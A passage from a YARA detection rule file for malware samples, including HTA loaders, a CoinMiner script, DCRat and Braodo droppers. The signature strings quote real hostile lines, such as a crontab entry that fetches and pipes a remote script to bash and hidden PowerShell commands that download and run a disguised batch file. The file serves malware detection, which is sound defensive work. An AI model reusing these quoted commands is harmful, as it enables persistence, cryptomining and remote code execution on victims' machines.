      uint16(0) == 0x6944 and filesize < 40KB and
      1 of ($x*) and all of them
}

rule bd8b70eca4b1455867c73b40005b718f119484883f55e36451ed59a0cb7b57b4_bd8b70ec {
   meta:
      description = "_subset_batch - file bd8b70eca4b1455867c73b40005b718f119484883f55e36451ed59a0cb7b57b4_bd8b70ec.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "bd8b70eca4b1455867c73b40005b718f119484883f55e36451ed59a0cb7b57b4"
   strings:
      $x1 = ":\\x20','Windows\\x20Server\\x202022','WinHttp.WinHttpRequest.5.1','10.0','Groups','Status','RunLevel','VBScript','SELECT\\x20De" ascii /* score: '83.00'*/
      $x2 = "  var a0_0x172061=a0_0x5be9;(function(_0x29a690,_0x2a9584){var _0x59d2e9=a0_0x5be9,_0x8950f4=_0x29a690();while(!![]){try{var _0x" ascii /* score: '64.00'*/
      $x3 = "imit','push','Computer\\x20Name:\\x20','removable','sSubKeyName','Is\\x20Domain\\x20Joined:\\x20','cmd.exe','%userprofile%\\x5cM" ascii /* score: '44.00'*/
      $x4 = ",'Path_','Count','SELECT\\x20UUID\\x20FROM\\x20Win32_ComputerSystemProduct','SerialNumber','%SystemRoot%\\x5csystem32\\x5cshell3" ascii /* score: '41.00'*/
      $x5 = ",'GetFile','CreateShortcut','.exe','ConnectServer','GetFolder','Schedule.Service','[Error]\\x20Win32_ComputerSystem:\\x20','Proc" ascii /* score: '34.00'*/
      $x6 = "ES_ROOT\\x5c','WindowStyle','.txt','OpenDSObject','_usb.','WMI\\x20connection\\x20error:\\x20','.doc','getMonth','Model','---\\x" ascii /* score: '31.00'*/
      $s7 = "5307df(0xf3))+_0x2205d7;if(downloadFile(_0x4c3fc3,_0x5b3416))return RunWmi('msiexec.exe\\x20/i\\x20\\x22'+_0x5b3416+_0x5307df(0x" ascii /* score: '30.00'*/
      $s8 = "arentFolderName','USBSTOR','.com','MediaType','https://bucket-aws-s','NetBIOS\\x20Name:\\x20','charAt','root\\x5ccimv2','HKEY_CL" ascii /* score: '30.00'*/
      $s9 = "MtCPC','substring','ProcessorId','POST','Windows\\x20Server\\x202012\\x20R2','MSScriptControl.ScriptControl','GetObject','href'," ascii /* score: '27.00'*/
      $s10 = "\\x5cdefault','TargetPath','rundll32\\x20\\x22','ADODB.Stream','0123456789ABCDEF','Domain','1321108HeEgZy','14393','ComputerName" ascii /* score: '26.00'*/
      $s11 = "x20=\\x20CreateObject(\\x22ADODB.Stream\\x22)\\x0a','\\x5crun.py\\x22','Win32_Process','GetSpecialFolder','Domain\\x20Role:\\x20" ascii /* score: '26.00'*/
      $s12 = "r','DomainName','GetExtensionName','split','toString','Windows\\x207','152274DQlFGq','Logon\\x20Server:\\x20','[Error]\\x20Win32" ascii /* score: '26.00'*/
      $s13 = ",'\\x5cDefaultIcon\\x5c','LICATION\\x20','Shell.Application','Settings','[Error]\\x20DC\\x20Connection\\x20Check:\\x20','Executi" ascii /* score: '26.00'*/
      $s14 = "tipleInstances','6.3','ExecQuery','\\x5crun.py','curl.exe\\x20-k\\x20-o\\x20\\x22','_utf8_decode','join','Connected\\x20to\\x20D" ascii /* score: '25.00'*/
      $s15 = "7[_0x2c9dd8(0xd7)](0x2)+'\\x5c'+generateRandomString(0x9)+_0x2c9dd8(0x201),_0x1e7f63='cmd.exe\\x20/c\\x20'+_0x5379b0+_0x2c9dd8(0" ascii /* score: '25.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 200KB and
      1 of ($x*) and all of them
}

rule d6018cb4628be9026b2e581a96cb87f5b98fe227d95c8724ba248006285193fa_d6018cb4 {
   meta:
      description = "_subset_batch - file d6018cb4628be9026b2e581a96cb87f5b98fe227d95c8724ba248006285193fa_d6018cb4.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d6018cb4628be9026b2e581a96cb87f5b98fe227d95c8724ba248006285193fa"
   strings:
      $s1 = "  (function(_0x47c92f,_0x312309){var a0_0x2d6570={_0x145861:0x7ab,_0x1bd954:0x67f,_0x642365:0x442,_0x2d8fb4:0x337,_0x4a5f7e:0x5a" ascii /* score: '24.00'*/
      $s2 = "\\x37'+'\\x38\\x39',_0x48c78c='';function _0x522b49(_0x5be8ae,_0xa966f0){return a0_0x3edc97(_0x5be8ae- -a0_0x3145e9._0x3871fc,_0" ascii /* score: '13.00'*/
      $s3 = "x50f)](function(){function _0x3aae36(_0x134439,_0xa85d4f){return _0x508dfb(_0xa85d4f,_0x134439- -a0_0x8a1fa2._0x261250);}try{if(" ascii /* score: '12.00'*/
      $s4 = "_0x25a1b2,_0x4bfbcd){return a0_0x3edc97(_0x25a1b2- -0x52,_0x4bfbcd);}_0x53f9cd[_0x556cb0(a0_0x49d824._0x3a6b14,a0_0x49d824._0x4f" ascii /* score: '12.00'*/
      $s5 = "b8f81,_0x52c255){return a0_0x3edc97(_0x3b8f81- -0x1b,_0x52c255);}var _0x7ee5f5;typeof _0x20c59f!==_0x10e7ac(a0_0x3b0839._0x2bcf5" ascii /* score: '12.00'*/
      $s6 = "4ba957){return _0x508dfb(_0x2f6789,_0x4ba957- -a0_0x51aa37._0x1aed3a);}if(_0x5030c0(a0_0x1e81ff._0x26a7f4,a0_0x1e81ff._0x5be406)" ascii /* score: '12.00'*/
      $s7 = "ion a0_0x3edc97(_0xdc8ce1,_0x2afaa3){var a0_0x332047={_0x480c09:0x347};return a0_0x312e(_0xdc8ce1- -a0_0x332047._0x480c09,_0x2af" ascii /* score: '12.00'*/
      $s8 = "_0x1cd8cd,_0x5c61fe- -0x4bc);}if(_0x4bd8e6(0x11d,0xe5)==='\\x78\\x45\\x48\\x42\\x78')_0x574b0e(_0x32efcf,_0x14fe8b,_0x5d214e[_0x" ascii /* score: '12.00'*/
      $s9 = "1e9- -a0_0x2e3fac._0x73bd01,_0xe1ee96);}return _0x5cb8b8[_0xd0256f(a0_0x3da764._0x44fbea,0x3c)+_0xd0256f(0xa2,-0x18)](_0x5cb8b8[" ascii /* score: '12.00'*/
      $s10 = "5cb277:0xa1};function _0x24f5f7(_0xb78703,_0x29c347){return a0_0x3edc97(_0x29c347- -a0_0x30d028._0x5cb277,_0xb78703);}try{var _0" ascii /* score: '12.00'*/
      $s11 = "on _0x2ea152(_0x15fe16,_0x49a5f2){return _0x508dfb(_0x15fe16,_0x49a5f2- -a0_0x37db22._0x4092e0);}try{if(_0x2ea152(0x2e3,0x18f)!=" ascii /* score: '12.00'*/
      $s12 = "(){var a0_0x171484={_0x393f97:0x43c};function _0x410e9e(_0x50f99f,_0x3dfe48){return _0x508dfb(_0x3dfe48,_0x50f99f- -a0_0x171484." ascii /* score: '12.00'*/
      $s13 = "f)](function(){function _0x56f928(_0x5bd187,_0xe3d98){return _0x508dfb(_0xe3d98,_0x5bd187- -a0_0x49b2fe._0x1fa799);}try{if(_0x56" ascii /* score: '12.00'*/
      $s14 = "25d8b9._0x547bf9,0x10d),_0x406ef5,![]);function _0x47d175(_0x46a7e1,_0xc78bad){return a0_0x3edc97(_0xc78bad- -a0_0x185996._0x3c5" ascii /* score: '12.00'*/
      $s15 = "  <script type=\"text/javascript\">" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 800KB and
      8 of them
}

rule DarkCloud_signature__2 {
   meta:
      description = "_subset_batch - file DarkCloud(signature).xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c103ff6daaed16018630b4248df5bfee37327a8c3add6327071920a025e52a09"
   strings:
      $s1 = "Shfr.jiT" fullword ascii /* score: '10.00'*/
      $s2 = "Mwvo.cVX" fullword ascii /* score: '10.00'*/
      $s3 = "[Content_Types].xmlUT" fullword ascii /* score: '9.00'*/
      $s4 = "* LtKu" fullword ascii /* score: '9.00'*/
      $s5 = "5+%f%>" fullword ascii /* score: '9.00'*/ /* hex encoded string '_' */
   condition:
      uint16(0) == 0x4b50 and filesize < 9000KB and
      all of them
}

rule DarkCloud_signature__13cd3750 {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_13cd3750.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "13cd3750e4e59210ce45c830b5114b23d37b97b16cdbc818237bb4b7abae28ca"
   strings:
      $s1 = "SUYE:\"'" fullword ascii /* score: '10.00'*/
      $s2 = "[Content_Types].xmlUT" fullword ascii /* score: '9.00'*/
      $s3 = "5+%f%>" fullword ascii /* score: '9.00'*/ /* hex encoded string '_' */
   condition:
      uint16(0) == 0x4b50 and filesize < 8000KB and
      all of them
}

rule DarkCloud_signature__1b6824dc {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_1b6824dc.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1b6824dcc6734a968ca8746cc169f23d612b3c300dc927d1eead1d79af609651"
   strings:
      $s1 = "oWok.yZL" fullword ascii /* score: '10.00'*/
      $s2 = "[Content_Types].xmlUT" fullword ascii /* score: '9.00'*/
      $s3 = "5+%f%>" fullword ascii /* score: '9.00'*/ /* hex encoded string '_' */
   condition:
      uint16(0) == 0x4b50 and filesize < 9000KB and
      all of them
}

rule cdf1bfb19d88c50b067c8241ac2cdd1996d7efed86e2c68f70ef79285f436000_cdf1bfb1 {
   meta:
      description = "_subset_batch - file cdf1bfb19d88c50b067c8241ac2cdd1996d7efed86e2c68f70ef79285f436000_cdf1bfb1.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "cdf1bfb19d88c50b067c8241ac2cdd1996d7efed86e2c68f70ef79285f436000"
   strings:
      $s1 = "[Content_Types].xmlUT" fullword ascii /* score: '9.00'*/
      $s2 = "$%D%|\\0" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 2000KB and
      all of them
}

rule beacaf2c09d8de76bf1ad07ae414c849b70add617d58144a51111e22fd423d1b_beacaf2c {
   meta:
      description = "_subset_batch - file beacaf2c09d8de76bf1ad07ae414c849b70add617d58144a51111e22fd423d1b_beacaf2c.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "beacaf2c09d8de76bf1ad07ae414c849b70add617d58144a51111e22fd423d1b"
   strings:
      $s1 = "Execute \"Ligas.\" + Psychrometres + \"Exe\" & chr(99) & \"ute Coattail,Shopworn,Decades,Indlaansrenter ,Philoplutonic\"" fullword ascii /* score: '20.00'*/
      $s2 = "Interconnectionshjlpe = Command " fullword ascii /* score: '17.00'*/
      $s3 = "Uopdagetbinderiesv = Uopdagetbinderiesv * (1+1)" fullword ascii /* score: '16.00'*/
      $s4 = "Rem Trackpot? tempelhal. squamosoradiate: oprundnes" fullword ascii /* score: '14.00'*/
      $s5 = "Byggehaandvrker = Byggehaandvrker + \"VFFFF:\"" fullword ascii /* score: '14.00'*/
      $s6 = "Byggehaandvrker = Byggehaandvrker + \"Get-D\"" fullword ascii /* score: '13.00'*/
      $s7 = "Byggehaandvrker = Byggehaandvrker + \"LLLa L LdLL \"" fullword ascii /* score: '13.00'*/
      $s8 = "Wscript.Sleep 100" fullword ascii /* score: '13.00'*/
      $s9 = "Rem Postganges128! gaincome ansttelsesperioders13 interspersions tait?" fullword ascii /* score: '12.00'*/
      $s10 = "Byggehaandvrker = Byggehaandvrker + \"ksmede ' ---\"" fullword ascii /* score: '12.00'*/
      $s11 = "Rem Staldfidusers medisterplse" fullword ascii /* score: '12.00'*/
      $s12 = "Byggehaandvrker = Byggehaandvrker + \"B ---C  --\"" fullword ascii /* score: '12.00'*/
      $s13 = "Rem Beteem: breviloquence langfingrenes superport udbenede" fullword ascii /* score: '12.00'*/
      $s14 = "  Backbiter.EnumKey Bredskyggets, Trinlses, Landinger" fullword ascii /* score: '12.00'*/
      $s15 = "Curculionidaejockeyern = MidB(\"Afvigende\", 15, 228)" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x7546 and filesize < 200KB and
      8 of them
}

rule bee6b37df67cb80ce2983556914084c6b7a8c2b1e047c856f745135025ba79a7_bee6b37d {
   meta:
      description = "_subset_batch - file bee6b37df67cb80ce2983556914084c6b7a8c2b1e047c856f745135025ba79a7_bee6b37d.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "bee6b37df67cb80ce2983556914084c6b7a8c2b1e047c856f745135025ba79a7"
   strings:
      $s1 = "Smdllx" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 3000KB and
      all of them
}

rule CoinMiner_signature__3 {
   meta:
      description = "_subset_batch - file CoinMiner(signature).sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1e891ab1521b27923233e694f60fdbf0e1b840e657d8b1ffdefd8b5ef5e38964"
   strings:
      $s1 = "        if wget -qO- --timeout=3 -4 http://ip-api.com/json/ | grep -q '\"country\":\"China\"'; then" fullword ascii /* score: '29.00'*/
      $s2 = "if ! crontab -l 2>/dev/null | grep -q \"wget -O - http://162.248.53.119:8000/mon.sh | bash\"; then" fullword ascii /* score: '29.00'*/
      $s3 = "# Function to download and execute a script" fullword ascii /* score: '25.00'*/
      $s4 = "    (crontab -l 2>/dev/null; echo \"*/30 * * * * wget -O - http://162.248.53.119:8000/mon.sh | bash\") | crontab -" fullword ascii /* score: '24.00'*/
      $s5 = "# Function to monitor and kill high CPU usage processes" fullword ascii /* score: '24.00'*/
      $s6 = "        sysctl -n hw.ncpu 2>/dev/null || nproc 2>/dev/null || getconf _NPROCESSORS_ONLN 2>/dev/null || echo 1" fullword ascii /* score: '23.00'*/
      $s7 = "download_and_execute() {" fullword ascii /* score: '22.00'*/
      $s8 = "        if curl -s --connect-timeout 3 -4 http://ip-api.com/json/ | grep -q '\"country\":\"China\"'; then" fullword ascii /* score: '20.00'*/
      $s9 = "    pids=$(pgrep -f \"list.com:9443|list.com:1443\" | while read pid; do" fullword ascii /* score: '20.00'*/
      $s10 = "        grep -c ^processor /proc/cpuinfo" fullword ascii /* score: '18.00'*/
      $s11 = "    # Execute if download succeeded" fullword ascii /* score: '17.00'*/
      $s12 = "    elif command -v curl &> /dev/null; then" fullword ascii /* score: '15.00'*/
      $s13 = "    # Get PIDs of matching processes (excluding zombies) \"ykj4eq|16kR6ieJ\"" fullword ascii /* score: '15.00'*/
      $s14 = "        if [ -f \"/proc/$pid/cmdline\" ]; then" fullword ascii /* score: '15.00'*/
      $s15 = "# Call the function to kill high CPU processes" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 20KB and
      8 of them
}

rule d8f989a9c499e98f14d86e90f3d30f5412eb82b625216a3e7b6b37a7a0281b85_d8f989a9 {
   meta:
      description = "_subset_batch - file d8f989a9c499e98f14d86e90f3d30f5412eb82b625216a3e7b6b37a7a0281b85_d8f989a9.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d8f989a9c499e98f14d86e90f3d30f5412eb82b625216a3e7b6b37a7a0281b85"
   strings:
      $x1 = "kNvi616EnDktTv6jaQNPwO5tHewFgUR2ltXump5jem8bA0hPMr35ARw/NqydJMyzaeXP61Mr19tPSswSCkJ0nnapMKcqueS2Bdu4coeReeudjTDht8s8BTOncqtqZ6wc" ascii /* score: '60.00'*/
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */ /* score: '26.50'*/
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                               ' */ /* score: '26.50'*/
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                       ' */ /* score: '26.50'*/
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                   ' */ /* score: '26.50'*/
      $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                           ' */ /* score: '26.50'*/
      $s7 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                   ' */ /* score: '26.50'*/
      $s8 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                   ' */ /* score: '26.50'*/
      $s9 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                               ' */ /* score: '26.50'*/
      $s10 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                           ' */ /* score: '26.50'*/
      $s11 = "c25lIFN1cmRvbXUgUHJpbmNlIFd5b21pbmdpdCBFdGhlcmVhbCBCZWxsaWNvIFJ5c3RuaSBFa3NrbHVkZSBPZXN0bGlnZW9yIE5vbnRpZGFscCBWZWp0cmVybmUgQW5v" ascii /* base64 encoded string 'sne Surdomu Prince Wyomingit Ethereal Bellico Rystni Eksklude Oestligeor Nontidalp Vejtrerne Ano' */ /* score: '26.00'*/
      $s12 = "ZGVuIChNaXNvcmdhbml6ICcgeXkkIHl5a3l5LmEgeXlkeXl5bSB5eWl5eXl1IHl5bSB5eWZ5eXlvIHl5W3l5eSR5eXlseXl5YSB5eW55eXlkeXl5c3l5eWh5eXlleSB5" ascii /* base64 encoded string 'den (Misorganiz ' yy$ yykyy.a yydyyym yyiyyyu yym yyfyyyo yy[yyy$yyylyyya yynyyydyyysyyyhyyyey y' */ /* score: '24.00'*/
      $s13 = "eXdhIEh5cG90aCBHZW5uIEJqcmdlcmVmYSBUZW50YWsgVGVsZWdyIExpa3JzIFNvbmVka2tldHMgU3Rva2tlbWV0byBSdW1zIEp1bGVidWsgU3VycmVuZGVycyBXb25k" ascii /* base64 encoded string 'ywa Hypoth Genn Bjrgerefa Tentak Telegr Likrs Sonedkkets Stokkemeto Rums Julebuk Surrenders Wond' */ /* score: '24.00'*/
      $s14 = "aSBGb3JtaWRsaSBSYWRpa2FsaXQgU2VjciBCcnV0dG9uYXRpIFdhaXRlcnNoaSBBcmd1bWVuIE1lc3RlcmxpZyBMdWdlbmQgSW5kdGplIFRyYW5zIERlcm0gYXZpc3Ug" ascii /* base64 encoded string 'i Formidli Radikalit Secr Bruttonati Waitershi Argumen Mesterlig Lugend Indtje Trans Derm avisu ' */ /* score: '24.00'*/
      $s15 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA2" ascii /* base64 encoded string '                                                                                               6' */ /* score: '22.00'*/
   condition:
      uint16(0) == 0x4e6b and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule DCRat_signature__2 {
   meta:
      description = "_subset_batch - file DCRat(signature).svg"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c924fc4c8bb82c615999800709cb34f756342d79b0502403d7ef18538061678a"
   strings:
      $x1 = "<image href=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAABgAAAAQACAIAAACoEwUVAAEAOmNhQlgAAQA6anVtYgAAAB5qdW1kYzJwYQARABCAAACq" ascii /* score: '69.00'*/
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */ /* score: '26.50'*/
      $s3 = "BHty81+0qTMPJRz7iRpYDo+8K4IogLAmCq91yX3GZNW1lmoT/deXS/Kjm+w5BDgOe8T3kEGzoN1x7XmBDlL0Lex0NTSpYpD9bC8fAhaQ1LA5Ru6Mbg/KbYgo2HJr/GcV" ascii /* score: '24.00'*/
      $s4 = "+6tIpoljl1S1vVxuBEcKwKV9dxEJx9RzQBiad8OLy3srW1lubd1so7a2gkaeeUyRx3EMrEq7FYsrAo2IMZ7gACgC/r/AIN1bVNdmuTextanULS9i3XMy+WkLRMYvJX92" ascii /* score: '22.00'*/
      $s5 = "IgBp2HFiRC4f7DfBQM2HDmir/EYEkBQrAGQGbhQaHBNLRQbGlpylbD0/gcL2bhcP2KRJZYlCERFIgSwYtmKwcHBdevWVpkKJ3SQTKeZ2USR8xeo28HBhAIgpVCiyKQ8H" ascii /* score: '21.00'*/
      $s6 = "qQnSGWCjclNUhsx/0aNPV0P6172D8gsuWySGdWMDDlL86oEYepG82odyW82cIuSvcm4XrRvU2XXZMPVXzQYOgkmyn+GrZZ4VlAppdP5JpgC/V0O46apLfoX5UiMHrZPz" ascii /* score: '21.00'*/
      $s7 = "cC4y2BVTx3BQ3EMTwHLTjesQI0N6KOi3AxpbcFXxH8elfherY12509CKB4nSiedVluYX77t+Op0CmTbJBALQqp830PPG+/adeyek6mTkSNNZoJRBzCNsnR2z4mX/8j3g" ascii /* score: '21.00'*/
      $s8 = "OWWG2+86f4PuD9rJpU85MNwAwKihl65oBFVn5eOHTl+8ODhougiAhAVvR4BDg2PzM7Nnne/8x9y8SWveNUrhjudPhc5ZQSCCnWvgDxHykQESbEuFpeWzjvvAgDUmpUqB" ascii /* score: '21.00'*/
      $s9 = "7uXF3ZP2vFksqgmi3tWxitLiysLza6lhZVdk8Vdoz3LC8uLyysLSysLCytLk93jPXtGy7sWFpYmu/fs3r1rYWn34uKeye5dy41qRiONANTHH8YOFHbmkoP7V6/7zSc+5" ascii /* score: '19.00'*/
      $s10 = "M08BF6lZCQMuhYB3Axl231JuyS3x8znVBQrRH2Ue7c8lf1w7dcVlKRYrGBDgcKkYUqRCdrvqZ5/25M2a+sz7nPs1l2kZfEjsl2+R7O2D76o0rONCjCOMh4KIRClk+jSK" ascii /* score: '19.00'*/
      $s11 = "25ou9G2OslnaDWgP3wKEg1oFE/vBFGbqBC4dSOUpuNKEYETNhTrIvh0k4v+7uDulrJuM8XScTg17+iCIwCnEEI1KgX/x2d/wy03f+Rd93zOnbd9xsd82Od8xId/1hNK3" ascii /* score: '19.00'*/
      $s12 = "razzzzf1SFwEIG07xmgmLrOEMjxRAq1olfcK1bInuGjYdMJwXN97Y4O1ZxbUHQfATuJeMEyeSbDj8f2WeMzj4QKwp5i59LJRtgKlC0a1+whZqUnypmCDBCVvQxdKRuj9" ascii /* score: '19.00'*/
      $s13 = "3Lv9rW8xwvbym0P7u7lUyMBcmjZBOtrdAeyEwB0keYiznR8mTI9YDvO+V1K9LeYWn2BxrD3oAcNoyRSss3iJ07ASXwiBpUSRQCmsYEJycdpSq4uCZSIfRlcnmjs9TCpz" ascii /* score: '19.00'*/
      $s14 = "3QcsDvsM2gmXNg0P0CwIuQgSwywjDVyCbo2bBUN9Sms/LXwcdBbOfpqAu8gsLWTw8tMPKyA0On1qsFSImJfynA6S4t8IrKY6xL6HuhmrzRcJ7icoSsjeqVwTk4z2rjmV" ascii /* score: '19.00'*/
      $s15 = "Pm4TUPLwjSY6h0dzDzmZR/81X+80icwUANDTCwCIvWAYbgRAJCEhNy1cUbFTUN6JSKBMEJGDCVSCQMDcB7SyUVkZFlF8dNDDWjKMgjwAoCMQskSrUNCQicOBy0WVFaKE" ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 7000KB and
      1 of ($x*) and 4 of them
}

rule Braodo_signature__2 {
   meta:
      description = "_subset_batch - file Braodo(signature).bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9828f30941c66122a52a96ca290a03443b3a51fc1420436a26cb769718a99bbd"
   strings:
      $x1 = "echo jconnpwybwhuqjypfmagtvvznrpkuyatiyfsoscoulwfzuzexuruzalloqakvdbgkyqjluwbzifwyrmdsfdzhhipqamjreanjomstcjfaoqcklitxjhkcmgaeaj" ascii /* score: '65.00'*/
      $x2 = "start /min cmd /c \"powershell -WindowStyle Hidden -Command Invoke-WebRequest -Uri 'https://github.com/ud3-ux/9625-mrw1/raw/main" ascii /* score: '55.00'*/
      $x3 = "ud.png' -OutFile '%TEMP%\\um1-9625.bat'; Start-Process -FilePath '%TEMP%\\um1-9625.bat' -WindowStyle Hidden\"" fullword ascii /* score: '41.00'*/
      $x4 = "start /min cmd /c \"powershell -WindowStyle Hidden -Command Invoke-WebRequest -Uri 'https://github.com/ud3-ux/9625-mrw1/raw/main" ascii /* score: '39.00'*/
      $s5 = "fawlodlyeqbnyikddydzwftoqlgatgrsspytsntdbmoattexbkfzjadgryklwcjlyxbzsdcdhtcvannpoxxmswywmqsjbpyyvzklooyacnpyltydtxgetjmwrynkmues" ascii /* score: '18.00'*/
      $s6 = "jltavvustlnkveqpkiyggwjarkazlyuiyqrhhidsegetkjlnhgnqzuonjwirsjpeujmjskidvwedjsuwimgwtjpwggofmtghvwsbyvttckpxgdozlwtjllfeyetuihem" ascii /* score: '18.00'*/
      $s7 = "tvdumpyjahejgfvqnmjmgksyfygfgsmwfuhiuelthpftjehgjivbnuqebfcrxvsfakndcwjnjytazhuyyfodvymijobaeuuonipqibtepoggzmqbjasvwgybxxhcmcqa" ascii /* score: '18.00'*/
      $s8 = "aeayhbujjrawswgshkqxeorsrrmzvechgjoiaeyutraktudnskabxjqnmgjbozyaehbzihobbrunliunemsbrzfbstyqpnkasimkndpcuxxcimkircbhsvrakadmqndg" ascii /* score: '16.00'*/
      $s9 = "dvyfzsdfhqewakonngrynlisrywuuguufhwdyeqgrvxmqjaxakpngxkjizgshfngcusjctempcflrihrgqozpbbvuninpgqmtmhjhrltedlpjsujzahbgtglomvafjgt" ascii /* score: '15.00'*/
      $s10 = "wjurqasiyumrtppbsuzrqszzedvchykeyynbneilhgadbszwsllbdgoqftcedubppinpgtbzqnkxwtegjdrjojlmudaasizxdgdctoxvljihrqicotgcomxxajcyigoz" ascii /* score: '14.00'*/
      $s11 = "bqlehdgnlgkrgnvfyjsxnlogkctvkcwaovadcpkqnuklhaghcqawrtsksbqndcuuijzqmvhzohcdxhmbqpmadvvkpkdmymjsatpjujulqleynqalxuzaizgwlwpfqzcn" ascii /* score: '13.00'*/
      $s12 = "wkbaemlrjbsembankrmlwjkgiwizqlivirdvqxsciefhwuhimnveokhdjbwsplttmhiytdhuafvaylusuematjkzewwzodlogbhtbdnkpkglujdveghwiujkcsvwkowi" ascii /* score: '13.00'*/
      $s13 = "wwepomnfydvwcpjhsrkjhajzgwuhopkhavynlwfyltaaxxqasghwdwviydzgithnywpjnqqqbstazdksferluhvqswzmkmzsoffemlrfggeteecvxffargfqtfdvlarf" ascii /* score: '13.00'*/
      $s14 = "sznriowdovwjwcbqszfwpeyemljlvwknnsxulpvgtmngjgdmfheqaujbxoyhzgntqonwzegxnosethesfzuaxxvlskbyhyqkhekrjlfzoqqglxatupiopnuhwcjsgtvb" ascii /* score: '13.00'*/
      $s15 = "gzobgghlgfcbccvnmevvvuyjxlxnpdhjmnqugqmeyoxtoiejtbkbqpqulrcmwucjaibeqneljeoukfdujwstdcfzusqsvrulyivbleyevjwwumgjpgwdbwxxwqzqrpoi" ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0xfeff and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule Braodo_signature__3 {
   meta:
      description = "_subset_batch - file Braodo(signature).py"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6e196192d46a481bd560d1c06ae41145f673e1af07ea4c37ae2970c10b2264f3"
   strings:
      $x1 = "pyobfuscate({getattr(__import__(Il),lIl)(lI,'',\"https://pyobfuscate.com\"):\"IllIlIIIIlIlIIllIllIlIlIlIIllllIlII\",'pyc':\"\"\"" ascii /* score: '48.50'*/
